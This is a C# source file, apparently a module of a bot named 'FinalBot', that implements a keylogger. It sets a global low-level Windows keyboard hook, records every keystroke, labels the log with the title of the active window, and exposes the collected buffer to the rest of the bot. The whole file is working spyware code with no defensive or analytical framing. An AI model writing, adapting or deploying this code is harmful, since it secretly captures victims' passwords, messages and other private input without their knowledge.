using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace FinalBot.Modules
{
    public static class KeyloggerModule
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static StringBuilder _buffer = new StringBuilder();
        private static string _lastWindowTitle = "";

        public static void Start()
        {
            _hookID = SetHook(_proc);
        }

        public static void Stop()
        {
            UnhookWindowsHookEx(_hookID);
        }

        public static string GetBuffer()
        {
            string log = _buffer.ToString();
            _buffer.Clear();
            return log;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                CheckActiveWindow();

                if (key.Length == 1) _buffer.Append(key);
                else if (key == "Space") _buffer.Append(" ");
                else if (key == "Return") _buffer.Append("\n[ENTER]\n");
                else _buffer.Append($"[{key}]");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void CheckActiveWindow()
        {
            IntPtr handle = GetForegroundWindow();
            int length = GetWindowTextLength(handle);
            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(handle, sb, sb.Capacity);
            string title = sb.ToString();

            if (title != _lastWindowTitle)
            {
                _buffer.AppendLine($"\n\n--- [ {title} ] ---");
                _lastWindowTitle = title;
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);
    }
}
